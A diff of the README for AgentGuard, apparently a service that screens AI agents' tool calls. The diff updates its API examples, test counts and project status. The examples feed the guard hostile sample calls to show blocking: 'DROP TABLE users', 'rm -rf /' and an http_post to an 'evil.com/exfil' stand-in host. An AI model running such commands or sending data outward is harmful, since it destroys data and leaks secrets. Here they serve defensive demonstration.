@@ -10,7 +10,7 @@
     <a href="https://demo.agentguard.tech"><img src="https://img.shields.io/badge/demo-try_it-green" alt="Demo"></a>
     <img src="https://img.shields.io/badge/license-BSL_1.1-orange" alt="License">
     <img src="https://img.shields.io/badge/endpoints-60+-blue" alt="Endpoints">
-    <img src="https://img.shields.io/badge/tests-773_passing-brightgreen" alt="Tests">
+    <img src="https://img.shields.io/badge/tests-617_JS%2FTS_passing-brightgreen" alt="Tests">
     <img src="https://img.shields.io/badge/coverage-67%25-yellow" alt="Coverage">
     <a href="https://github.com/thebotclub/AgentGuard/actions/workflows/test-coverage.yml"><img src="https://github.com/thebotclub/AgentGuard/actions/workflows/test-coverage.yml/badge.svg" alt="Tests"></a>
     <a href="https://github.com/thebotclub/AgentGuard/actions/workflows/e2e.yml"><img src="https://github.com/thebotclub/AgentGuard/actions/workflows/e2e.yml/badge.svg" alt="E2E Tests"></a>
@@ -46,11 +46,10 @@ import { AgentGuard } from '@the-bot-club/agentguard';
 
 const guard = new AgentGuard({ apiKey: process.env.AG_API_KEY });
 
-// Evaluate a tool call before executing it
+// Evaluate a tool call before executing it.
 const decision = await guard.evaluate({
   tool: 'database_query',
-  action: 'execute',
-  input: { query: 'DROP TABLE users' }
+  params: { query: 'DROP TABLE users' }
 });
 
 // → { result: 'block', reason: 'Destructive SQL operation', riskScore: 95 }
@@ -64,7 +63,7 @@ pip install agentguard-tech
 from agentguard import AgentGuard
 
 guard = AgentGuard(api_key="ag_live_...")
-decision = guard.evaluate(tool="shell_exec", action="run", input={"cmd": "rm -rf /"})
+decision = guard.evaluate(tool="shell_exec", params={"cmd": "rm -rf /"})
 # → blocked
 ```
 
@@ -118,9 +117,9 @@ Evaluate up to 50 tool calls in one request. Each runs in parallel with isolated
 curl -X POST https://api.agentguard.tech/api/v1/evaluate/batch \
   -H "x-api-key: $AG_API_KEY" \
   -d '{"calls":[
-    {"tool":"database_query","action":"read","input":{"table":"users"}},
-    {"tool":"shell_exec","action":"run","input":{"cmd":"ls"}},
-    {"tool":"http_post","action":"send","input":{"url":"https://evil.com/exfil"}}
+    {"tool":"database_query","params":{"table":"users"}},
+    {"tool":"shell_exec","params":{"cmd":"ls"}},
+    {"tool":"http_post","params":{"url":"https://evil.com/exfil"}}
   ]}'
 ```
 
@@ -210,7 +209,7 @@ Block unsafe agent deployments before they reach production:
 | Auth | bcrypt + SHA-256 key hashing |
 | Validation | Zod schemas on all endpoints |
 | Database | PostgreSQL with RLS |
-| Tests | 773 passing (617 JS + 156 Python) |
+| Tests | 617 JS/TS tests passing locally; Python integration tests included |
 | SDKs | TypeScript, Python |
 | Self-hosted | Docker + docker-compose |
 
@@ -236,7 +235,15 @@ cd AgentGuard
 docker-compose up -d
 ```
 
-See the [self-hosted guide](self-hosted/README.md) for configuration options.
+See the [self-hosted guide](docs/SELF_HOSTED.md) for configuration options.
+
+## Status
+
+AgentGuard is available as an alpha/private-beta security platform. The public
+hosted API currently uses the deployed Express contract at
+`https://api.agentguard.tech` with `/health` and `/api/v1/*` routes. The newer
+`packages/api` Hono control-plane code is under active development and should be
+treated as next/internal until it is deployed publicly.
 
 ## Links
 
